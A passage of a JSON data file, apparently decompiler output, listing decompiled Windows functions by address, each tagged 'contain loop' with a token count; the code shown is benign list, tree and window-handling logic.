1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "0041844c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041844c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((*(in_EAX + 4) != 0) && (iVar3 = *(*(in_EAX + 4) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00419610();\n            cVar1 = fcn.00404534();\n            if (cVar1 != '\\0') goto code_r0x004184ab;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if ((*(in_EAX + 8) == NULL) || (iVar3 = (**(**(in_EAX + 8) + 0x54))(),  iVar3 < 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x004184ab:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 264
    },
    "004184b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.004184b4(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419610();\n            cVar1 = fcn.0040486c();\n            if (cVar1 != '\\0') goto code_r0x004184ee;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x004184ee:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "004186a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004186a8(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.00419610();\n                uVar1 = fcn.004184b4();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004187c8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004187c8(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419610();\n            uVar2 = fcn.00418340(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 142
    },
    "004189d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.004189d0(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419610();\n            cVar1 = fcn.004185b8();\n            if (cVar1 != '\\0') goto code_r0x00418a08;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418a08:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 234
    },
    "00418a14": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418a14(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419610();\n            iVar1 = fcn.0041966c();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004183b0();\n    fcn.004194b8();\n    return;\n}\n",
        "token_count": 145
    },
    "00418d90": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418d90(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x418da0;\n    fcn.004189ac();\n    uStack16 = 0x418df5;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.004189d0();\n        if (cVar1 != '\\0') break;\n        fcn.004189b8();\n        if (in_EAX == *0x4172f4) break;\n        in_EAX = fcn.004045cc();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x418dfc;\n    uStack16 = 0x418df4;\n    fcn.00418a64();\n    return;\n}\n",
        "token_count": 236
    },
    "0041929c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041929c(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.004075b8();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.00419610();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0041966c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041966c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "0041cc50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041cc50(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00419610();\n                fcn.00404640();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00404640();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0041cf88": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cf88(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040669c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004194b8();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0041f924": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041f924(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.00419610();\n                fcn.0041f924();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "004200a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004200a4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00419610(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "00420120": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420120(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419610();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.00419504();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00420694": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420694(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x4206a4;\n    iVar1 = fcn.00419980();\n    uStack24 = 0x4206e9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419610();\n            fcn.00404640();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4206f0;\n    uStack24 = 0x4206e8;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 229
    },
    "00422dd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00422dd0(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    fcn.004054c0();\n    puVar1 = fcn.0040a414();\n    while( true ) {\n        iVar2 = fcn.0040572c();\n        if ((iVar2 < 1) || ((0x20 < *puVar1 && (*puVar1 != 0x2e)))) break;\n        fcn.004058fc();\n        fcn.00405b8c();\n        puVar1 = fcn.0040a414();\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "00440b88": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440b88(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint in_EDX;\n    uint var_4h;\n    \n    if (in_ECX < arg_8h) {\n        do {\n            fcn.0043e4e0(in_EDX, 1, in_ECX);\n            in_ECX = in_ECX + 1;\n        } while (in_ECX < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00443020": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443020(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(in_EAX + 0x38);\n    if (iVar2 != 0) {\n        iVar3 = 0;\n        while (iVar2 = iVar2 >> 1,  iVar2 != 0) {\n            iVar3 = iVar3 + 1;\n        }\n        if (0xe < iVar3) {\n            piVar1 = *(in_EAX + 0x20);\n            *(*piVar1 + 0x14) = 0x28;\n            (***piVar1)();\n        }\n        fcn.00442fc8();\n        if (iVar3 != 0) {\n            fcn.00442f0c();\n        }\n        *(in_EAX + 0x38) = 0;\n        fcn.00442ff4();\n        *(in_EAX + 0x3c) = 0;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00445b7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00445b7c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack24 = 0x445b8e;\n    fcn.004058ec();\n    uStack28 = 0x445bfe;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    uStack40 = 0x445bd7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar2 = 1;\n    puStack24 = &stack0xfffffffc;\n    while( true ) {\n        iVar1 = fcn.0040572c();\n        if (iVar1 < iVar2) break;\n        fcn.004459d4();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack44;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x445c05;\n    uStack28 = 0x445bfd;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 306
    },
    "0044e204": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044e204(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419610();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0045481c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045481c(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004563c8();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.004563d8();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.004538bc();\n                }\n            }\n            else {\n                iVar2 = fcn.004563d8();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.004563d8();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 250
    },
    "00456490": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456490(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004563c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004563d8();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004568f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004568f4(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.004563c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.004563d8();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00456988": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00456988(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 73
    },
    "00457c14": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457c14(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00458f98": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458f98(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.00419610();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.00419610();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "0045bdc4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0045bdc4(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.00419610();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 156
    },
    "0045bdfc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045bdfc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.00466ca8();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0045bee0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045bee0(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStackY20;\n    \n    iVar5 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStackY20 = 0x45befb;\n            piVar2 = fcn.00419610();\n            iVar5 = *piVar2;\n        }\n        else {\n            iStackY20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 = iVar3,  iVar5 == 0 && (iVar4 != 0))) {\n                cVar1 = fcn.0045bdc4();\n                if (cVar1 == '\\0') {\n                    iVar3 = sub.user32.dll_GetWindow();\n                    iStackY20 = iVar4;\n                }\n                else {\n                    iVar5 = **(*(in_EAX + 4) + iStackY20 * 4);\n                    iVar3 = iVar4;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStackY20, iVar5);\n}\n",
        "token_count": 300
    },
    "0045c964": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045c964(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.0045c904(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 107
    },
    "0045d488": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045d488(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.0045b9a4(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 115
    },
    "0045eab0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045eab0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\n                fcn.00476b58();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00462b00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00462b00(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 91
    },
    "00463494": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00463494(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0041966c();\n    iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.00419610();\n            if (*(iVar2 + 0x1b4) != 0) {\n                return *(iVar2 + 0x1b4);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00468048": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00468048(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xdfff;\n    }\n    else {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x2000;\n    }\n    if ((*(in_EAX + 0x1d0) != 0) && (iVar1 = *(*(in_EAX + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00419610();\n            fcn.00468048();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00468b4c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00468b4c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00468be8();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 102
    },
    "00468bb0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00468bb0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 94
    },
    "00468bc4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00468bc4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.0046920c();\n    while (iVar1 != 0) {\n        iVar1 = fcn.004691e4();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 88
    },
    "00468be8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.00468be8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.0046920c(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.00468be8();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 162
    },
    "00468f5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00468f5c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.004691e4();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 123
    },
    "00469134": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00469134(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 68
    },
    "00469144": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00469144(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.00469130();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.00468bb0();\n        if (0 < iVar2) {\n            fcn.00469134();\n            fcn.00469144();\n        }\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00469184": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00469184(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.00469108();\n        iVar3 = fcn.00468c20();\n        if (iVar2 < iVar3) {\ncode_r0x004691b8:\n            fcn.00468dec();\n            fcn.004694c4(0x46afc0, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.00469108();\n            iVar3 = fcn.00468c68();\n            if (iVar3 < iVar2) goto code_r0x004691b8;\n        }\n        fcn.00469184();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 223
    },
    "004691f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004691f0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00468be8();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 119
    },
    "00469488": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469488(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.00469488(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.00469488(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "0046a5e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046a5e0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0046a5e0(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0046a5e0(arg_8h);\n    }\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 106
    },
    "0046adb8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046adb8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.004691e4();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.00468be8();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.00469130();\n                }\n                else {\n                    fcn.00469108();\n                    fcn.00469130();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.0046920c();\n        fcn.0046adb8(iVar2);\n        fcn.004691e4();\n        fcn.0046adb8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "0046b22c": {
        "rules": [
            "contain loop"
        ],
